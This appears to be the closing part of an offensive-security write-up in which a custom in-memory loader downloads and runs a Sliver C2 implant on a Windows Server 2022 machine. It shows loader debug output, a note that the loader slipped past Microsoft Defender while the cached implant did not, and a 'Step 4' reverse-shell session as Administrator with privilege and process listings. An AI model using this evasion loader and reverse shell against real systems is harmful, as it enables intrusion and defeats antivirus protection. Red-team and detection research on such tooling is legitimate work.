[+] Function Name: GetEnvironmentStringsW, Address: 00007FFF6169F960
[+] Written to IAT at address: 0000000000E17640
[+] Function Name: GetConsoleMode, Address: 00007FFF616A45F0
[+] Written to IAT at address: 0000000000E17648
[+] Function Name: FreeEnvironmentStringsW, Address: 00007FFF6169F980
[+] Written to IAT at address: 0000000000E17650
[+] Function Name: ExitProcess, Address: 00007FFF6169DCD0
[+] Written to IAT at address: 0000000000E17658
[+] Function Name: DuplicateHandle, Address: 00007FFF616A3BA0
[+] Written to IAT at address: 0000000000E17660
[+] Function Name: CreateWaitableTimerExW, Address: 00007FFF616A3C80
[+] Written to IAT at address: 0000000000E17668
[+] Function Name: CreateThread, Address: 00007FFF6169B270
[+] Written to IAT at address: 0000000000E17670
[+] Function Name: CreateIoCompletionPort, Address: 00007FFF616A0120
[+] Written to IAT at address: 0000000000E17678
[+] Function Name: CreateFileA, Address: 00007FFF616A3E00
[+] Written to IAT at address: 0000000000E17680
[+] Function Name: CreateEventA, Address: 00007FFF616A3BE0
[+] Written to IAT at address: 0000000000E17688
[+] Function Name: CloseHandle, Address: 00007FFF616A3B90
[+] Written to IAT at address: 0000000000E17690
[+] Function Name: AddVectoredExceptionHandler, Address: 00007FFF635C4F50
[+] Written to IAT at address: 0000000000E17698
[+] VirtualProtect succeeded for address: 0000000000401000, size: 5235200 (0x4fe200), permissions: 32
[+] VirtualProtect succeeded for address: 0000000000900000, size: 5335552 (0x516a00), permissions: 2
[+] VirtualProtect succeeded for address: 0000000000E17000, size: 310272 (0x4bc00), permissions: 4
[+] VirtualProtect succeeded for address: 0000000000ECB000, size: 1536 (0x600), permissions: 4
[+] Calling entry point at address: 0000000000468A00
[+] freeing original opened/downloaded payload at address 000002136D476070


Important notes:
----------------
> The loader worked correctly and I got a Sliver C2 reverse shell (example in 'step 4'). 
> However, while the loader itself was not detected by the MS Defender Antivirus, a copy of the C2 reverse shell was detected because it was 
  stored in the folder "AppData\Local\Microsoft\Windows\INetCache\IE\" by the tool when downloading it.

	Windows Defender AV - Threat detection: Trojan:Win32/SuspGolang.AG
	-------------------------------------------------------------------
	Alert level: Severe
	Details: This program is dangerous and executes commands from an attacker.
	Affected Items:
	file: C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\YGW3S37V\SliverRevShell2.exe

> I had the same results when testing the other sleep obfuscation methods.


------------------------------------------------------------------------------------------------------------------------------------
Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows server 2022 (without being blocked by the MS Defender AV)
------------------------------------------------------------------------------------------------------------------------------------

[*] Session 2b18378e COOING_HUNT - 192.168.1.25:65270 (Server-Win2022) - windows/amd64 - Tue, 12 Aug 2025 21:24:34 EDT

[server] sliver > sessions

 ID         Name          Transport   Remote Address       Hostname         Username                       Operating System   Locale   Last Message                              Health
========== ============= =========== ==================== ================ ============================== ================== ======== ========================================= =========
 2b18378e   COOING_HUNT   http(s)     192.168.1.25:65270   Server-Win2022   SERVER-WIN2022\Administrator   windows/amd64      en-US    Tue Aug 12 21:27:56 EDT 2025 (3s ago)     [ALIVE]


[server] sliver > sessions -i 2b18378e

[*] Active session COOING_HUNT (2b18378e)

[server] sliver (COOING_HUNT) > pwd

[*] C:\temp

[server] sliver (COOING_HUNT) > getuid

S-1-5-21-3336774573-1234467604-3718094125-500

[server] sliver (COOING_HUNT) > getprivs

Privilege Information for Dojo2judo.exe (PID: 2864)
---------------------------------------------------

Process Integrity Level: High

Name                                            Description                                                            Attributes
====                                            ===========                                                            ==========
SeIncreaseQuotaPrivilege                        Adjust memory quotas for a process                                     Disabled
SeSecurityPrivilege                             Manage auditing and security log                                       Disabled
SeTakeOwnershipPrivilege                        Take ownership of files or other objects                               Disabled
SeLoadDriverPrivilege                           Load and unload device drivers                                         Disabled
SeSystemProfilePrivilege                        Profile system performance                                             Disabled
SeSystemtimePrivilege                           Change the system time                                                 Disabled
SeProfileSingleProcessPrivilege                 Profile single process                                                 Disabled
SeIncreaseBasePriorityPrivilege                 Increase scheduling priority                                           Disabled
SeCreatePagefilePrivilege                       Create a pagefile                                                      Disabled
SeBackupPrivilege                               Back up files and directories                                          Disabled
SeRestorePrivilege                              Restore files and directories                                          Disabled
SeShutdownPrivilege                             Shut down the system                                                   Disabled
SeDebugPrivilege                                Debug programs                                                         Disabled
SeSystemEnvironmentPrivilege                    Modify firmware environment values                                     Disabled
SeChangeNotifyPrivilege                         Bypass traverse checking                                               Enabled, Enabled by Default
SeRemoteShutdownPrivilege                       Force shutdown from a remote system                                    Disabled
SeUndockPrivilege                               Remove computer from docking station                                   Disabled
SeManageVolumePrivilege                         Perform volume maintenance tasks                                       Disabled
SeImpersonatePrivilege                          Impersonate a client after authentication                              Enabled, Enabled by Default
SeCreateGlobalPrivilege                         Create global objects                                                  Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege                   Increase a process working set                                         Disabled
SeTimeZonePrivilege                             Change the time zone                                                   Disabled
SeCreateSymbolicLinkPrivilege                   Create symbolic links                                                  Disabled
SeDelegateSessionUserImpersonatePrivilege       Obtain an impersonation token for another user in the same session     Disabled


[server] sliver (COOING_HUNT) > ps

 Pid    Ppid   Owner                          Arch     Executable                    Session
====== ====== ============================== ======== ============================= =========
 0      0                                              [System Process]              -1
 4      0                                     x86_64   System                        0
 100    4                                     x86_64   Registry                      0
 308    4                                     x86_64   smss.exe                      0
 408    400                                            csrss.exe                     -1
 496    400                                   x86_64   wininit.exe                   0
 516    488                                            csrss.exe                     -1
 596    488                                   x86_64   winlogon.exe                  1
 636    496                                   x86_64   services.exe                  0
 644    496                                   x86_64   lsass.exe                     0
 752    636                                   x86_64   svchost.exe                   0
 780    496                                            fontdrvhost.exe               -1
 788    596                                            fontdrvhost.exe               -1
 872    636                                   x86_64   svchost.exe                   0
 920    636                                   x86_64   svchost.exe                   0
<SNIP>

? [1/3] Continue? No

⚠️  Security Product(s): Windows Defender, Windows Defender, Windows Smart Screen

<SNIP>
